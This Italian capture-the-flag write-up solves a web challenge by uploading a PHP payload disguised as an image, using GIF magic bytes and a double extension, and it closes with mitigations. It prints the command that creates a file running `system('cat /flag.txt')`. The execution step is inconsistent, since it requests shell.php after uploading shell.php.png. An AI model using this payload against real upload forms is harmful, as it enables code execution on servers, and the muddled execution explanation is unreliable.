## 🧙‍♂️ Challenge: I Got Magic

**Categoria:** Web
**URL:** [http://got-magic.challs.olicyber.it](http://got-magic.challs.olicyber.it)
**Descrizione:**

> Questa pagina web è così noiosa, posso solo caricare le foto dei miei gattini preferiti. Riesci a fare qualcosa di più interessante?

**Flag:** si trova in `/flag.txt`

---

## 🔍 Analisi iniziale

Accedendo al sito, troviamo un **form di upload** che accetta solo **immagini**. Tuttavia, la descrizione lascia intendere che possiamo “fare qualcosa di più interessante”.

---

## 💡 Obiettivo

Caricare un **file PHP camuffato da immagine**, in modo che venga **accettato** e **eseguito** dal server, permettendoci di leggere la flag.

---

## 🔬 Soluzione tecnica

### 🔹 1. Creazione del file malevolo

Per bypassare i controlli, abbiamo creato un file che:

* Inizia con i **magic bytes validi di una GIF** (`GIF89a`)
* Contiene **codice PHP** da eseguire
* Ha un’**estensione `.png`** per ingannare il filtro

Comando usato:

```bash
echo -e "GIF89a<?php echo system('cat /flag.txt'); ?>" > shell.php
mv shell.php shell.php.png   (o anche tramite BurpSuite)
```

> 📝 Il file si presenta come immagine, ma in realtà è un file PHP.

---

### 🔹 2. Upload del file

Abbiamo caricato `shell.php.png` tramite il form. Il server ha accettato il file.

Dopo l’upload, il file è stato salvato nella cartella:

```
http://got-magic.challs.olicyber.it/uploads/
```

Verificando con Burp Suite o il browser, abbiamo trovato il file caricato, ad esempio:

```
http://got-magic.challs.olicyber.it/uploads/shell.php.png
```

### 🔹 3. Esecuzione del codice

Abbiamo quindi provato ad accedere direttamente a:

```
http://got-magic.challs.olicyber.it/uploads/shell.php
```

Nonostante l’estensione fosse `.png`, alcuni server **vedono l’estensione “.php” prima del punto successivo**, quindi eseguono il file!

Il server ha interpretato il PHP e restituito la flag da `/flag.txt`.

---

## 🎯 Flag

flag{REDHACKTED}

---

## ✅ Conclusione

La challenge sfrutta una tecnica reale: **bypass dei controlli di upload tramite magic bytes e doppia estensione**.

Questa vulnerabilità si verifica quando:

* Il server si fida **solo dei magic bytes** o **dell’estensione**
* La cartella `uploads/` **permette l'esecuzione PHP**
* Il server esegue file tipo `*.php.png` come PHP

---

## 🔐 Possibili mitigazioni (per la vita reale)

* Disabilitare l’esecuzione PHP nella directory `uploads/`
* Validare **contenuto, estensione e MIME** server-side
* Rimuovere le estensioni `.php`, `.phtml`, ecc. dai nomi dei file
* Salvare i file con nomi random e senza estensione
